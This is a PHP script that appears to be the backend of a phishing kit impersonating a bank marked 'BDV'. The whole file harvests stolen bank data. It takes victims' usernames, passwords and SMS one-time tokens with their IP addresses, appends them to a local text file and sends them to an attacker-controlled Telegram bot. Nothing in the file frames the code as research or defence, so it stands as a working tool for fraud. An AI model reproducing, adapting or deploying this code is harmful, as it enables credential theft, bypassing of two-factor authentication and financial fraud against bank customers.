<?php

require_once '../includes/main.php';
error_reporting(0);
session_start();

if ($_SERVER["REQUEST_METHOD"] == "POST") {

    function _isCurl(){
        return function_exists('curl_version');
    }
    
    function telegram_message($message, $keyb) {
        include "../config.php";
        
        if (_isCurl() == 1) {
            
            $curl = curl_init();
            
            $data = [
                'text' => $message,
                'chat_id' => $chat_ids,
                'parse_mode' => 'HTML',
                'reply_markup' => $keyb
                ];
            
            curl_setopt($curl, CURLOPT_URL, "https://api.telegram.org/bot".$bot_token."/sendMessage?".http_build_query($data));
            curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); 
            $result = curl_exec($curl);
            curl_close($curl);
            return true;
        } else {
    
            file_get_contents("https://api.telegram.org/bot".$bot_token."/sendMessage?".http_build_query($data));
            
            }
    }

    function get_user_ip(){
        // Get real visitor IP behind CloudFlare network
        if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
                  $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
                  $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
        }
        $client  = @$_SERVER['HTTP_CLIENT_IP'];
        $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
        $remote  = $_SERVER['REMOTE_ADDR'];
    
        if(filter_var($client, FILTER_VALIDATE_IP))
        {
            $ip = $client;
        }
        elseif(filter_var($forward, FILTER_VALIDATE_IP))
        {
            $ip = $forward;
        }
        else
        {
            $ip = $remote;
        }
    
        if ($ip == '::1') {
            $ip = '127.0.0.1';
        }
    
        return $ip;
    }


$InfoDATE = date("d-m-Y h:i:sa");
$ip = get_user_ip();

if(isset($_POST['userx'])) {

    if (!empty($_POST['userx']) and !empty($_POST['passx']) ) {
        // if (is_numeric($_POST['userx'])) {

            
    // $_SESSION['user'] = $_POST['userx'];
    $use = $_POST['userx'];
    $pwd = $_POST['passx'];
    
     
    
$msgx = "REYBTC 🏦BDV🏦

USUARIO: <code>$use</code>
CONTRASEÑA: <code>$pwd</code>

IP: <code>$ip</code>
FECHA: <code>$InfoDATE</code>";
    
    $file = fopen("ReyBtc.txt", "a+");
    fwrite($file, $msgx);
    fclose($file);
    
    telegram_message($msgx, '');
    exit();
    
    } 
} 
 


if(isset($_POST['otp1'])) {

        if (!empty($_POST['otp1']) ) {
            // if (is_numeric($_POST['userx'])) {
    
                
        // $_SESSION['user'] = $_POST['userx'];
        $sms1 = $_POST['otp1'];
        
         
        
$msgx ="REYBTC 🏦BDV🏦
TOKEN: <code>$sms1</code>
FECHA: <code>$InfoDATE</code>
IP: <code>$ip</code>";
        
        $file = fopen("ReyBtc.txt", "a+");
        fwrite($file, $msgx);
        fclose($file);
        
        telegram_message($msgx, '');
        exit();
        
        } 
     
        
        } 

if(isset($_POST['otp2'])) {

    if (!empty($_POST['otp2']) ) {

    $smserror = $_POST['otp2'];
            
             
            
$msgx ="REYBTC 🏦BDV🏦
TOKEN-Error: <code>$smserror</code>
FECHA: <code>$InfoDATE</code>
IP: <code>$ip</code>";
            
            $file = fopen("ReyBtc.txt", "a+");
            fwrite($file, $msgx);
            fclose($file);
            
            telegram_message($msgx, '');
            exit();
            
  } 
 } 
}  
?>